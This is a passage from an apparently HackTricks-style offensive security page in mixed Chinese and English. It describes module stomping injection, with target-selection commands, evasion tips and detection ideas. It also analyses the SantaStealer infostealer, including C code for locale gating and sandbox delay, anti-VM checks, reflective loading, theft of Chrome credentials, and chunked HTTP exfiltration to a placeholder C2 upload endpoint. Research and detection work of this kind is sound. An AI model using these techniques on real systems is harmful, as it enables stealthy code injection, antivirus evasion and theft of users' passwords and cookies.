Module stomping 不是分配明显的 private executable memory 或加载一个新的 sacrificial DLL，而是直接从目标进程中已经映射的 DLL 的 **`.text` section** 执行 payload。覆盖目标应当是一个 **已加载、基于磁盘的 image**，其 code space 能够容纳 payload，同时不破坏进程仍然需要的 code paths。

### Reliable target selection

对常见模块如 `uxtheme.dll` 或 `comctl32.dll` 的简单 stomping 很脆弱：DLL 可能并未加载到远程进程中，而且 code region 太小会导致进程崩溃。更可靠的流程是：

1. 枚举目标进程模块，并保留一个 **仅 names 的 include list**，列出已经加载的 DLL。
2. 先构建 payload，并记录其 **精确字节大小**。
3. 扫描磁盘上的候选 DLL，并将 PE section **`.text` `Misc_VirtualSize`** 与 payload size 比较。这比 file size 更重要，因为它反映的是在内存中映射后 executable section 的大小。
4. 解析 **Export Address Table (EAT)**，选择一个导出函数的 RVA 作为 stomp 起始 offset。
5. 计算 **blast radius**：如果 payload 超过所选函数边界，它会覆盖其后在内存中排列的相邻 exports。

常见的 recon/selection helpers 如下：
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- 优先使用远程进程中**已经加载**的 DLL，以避免 `LoadLibrary`/意外镜像加载带来的遥测。
- 优先选择目标应用很少执行的 exports，否则正常代码路径可能会在 thread creation 之前或之后命中被 stomp 的字节。
- 大型 implants 通常需要把 shellcode embedding 从字符串字面量改为 **byte-array/braced initializer**，这样 injector 源码中才能正确表示完整缓冲区。

Detection ideas
- 对 **image-backed executable pages**（`MEM_IMAGE`、`PAGE_EXECUTE*`）进行 remote writes，而不是更常见的 private RWX/RX 分配。
- 内存中的 exports entry points 字节与磁盘上的 backing file 不再匹配。
- remote threads 或 context pivots 从一个合法的 DLL export 开始执行，但其前几个字节最近被修改过。
- 针对 DLL `.text` pages 的可疑 `VirtualProtect(Ex)` / `WriteProcessMemory` 序列，随后又进行 thread creation。

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer（又名 BluelineStealer）展示了现代 info-stealers 如何把 AV bypass、anti-analysis 和 credential access 融合到一个工作流中。

### Keyboard layout gating & sandbox delay

- 一个 config 标志（`anti_cis`）通过 `GetKeyboardLayoutList` 枚举已安装的 keyboard layouts。如果发现 Cyrillic layout，样本会写入一个空的 `CIS` 标记，并在运行 stealers 之前终止，确保它不会在被排除的 locale 上触发，同时留下一个 hunting artifact。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 分层 `check_antivm` 逻辑

- 变体 A 遍历进程列表，用自定义滚动校验和对每个名称做哈希，并将其与嵌入式的 debugger/sandbox 黑名单比对；它还会对计算机名重复执行该校验和，并检查 `C:\analysis` 之类的工作目录。
- 变体 B 检查系统属性（进程数下限、最近运行时长），调用 `OpenServiceA("VBoxGuest")` 检测 VirtualBox additions，并在 sleep 前后执行计时检查以发现 single-stepping。任何命中都会在模块启动前中止。

### 无文件 helper + 双重 ChaCha20 reflective loading

- 主 DLL/EXE 内嵌了一个 Chromium credential helper，它要么被释放到磁盘，要么以内存方式手动映射；fileless 模式会自行解析 imports/relocations，因此不会写入任何 helper artifacts。
- 该 helper 存储了一个用 ChaCha20 加密两次的二阶段 DLL（两个 32-byte keys + 12-byte nonces）。两轮解密后，它会以 reflective 方式加载该 blob（不使用 `LoadLibrary`），并调用从 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) 派生的 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` exports。
- ChromElevator routines 使用 direct-syscall reflective process hollowing 注入到正在运行的 Chromium browser 中，继承 AppBound Encryption keys，并直接从 SQLite databases 中解密 passwords/cookies/credit cards，尽管有 ABE hardening 仍可实现。

### 模块化内存收集与分块 HTTP exfil

- `create_memory_based_log` 遍历一个全局 `memory_generators` function-pointer table，并为每个启用的模块（Telegram、Discord、Steam、screenshots、documents、browser extensions 等）创建一个 thread。每个 thread 将结果写入共享缓冲区，并在约 45 秒的 join window 后报告其文件数量。
- 完成后，所有内容会使用静态链接的 `miniz` library 打包为 `%TEMP%\\Log.zip`。随后 `ThreadPayload1` sleep 15s，并通过 HTTP POST 将 archive 以 10 MB chunks 发送到 `http://<C2>:6767/upload`，伪装成浏览器的 `multipart/form-data` boundary（`----WebKitFormBoundary***`）。每个 chunk 都会添加 `User-Agent: upload`、`auth: <build_id>`、可选的 `w: <campaign_tag>`，最后一个 chunk 会附加 `complete: true`，这样 C2 就知道 reassembly 已完成。

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
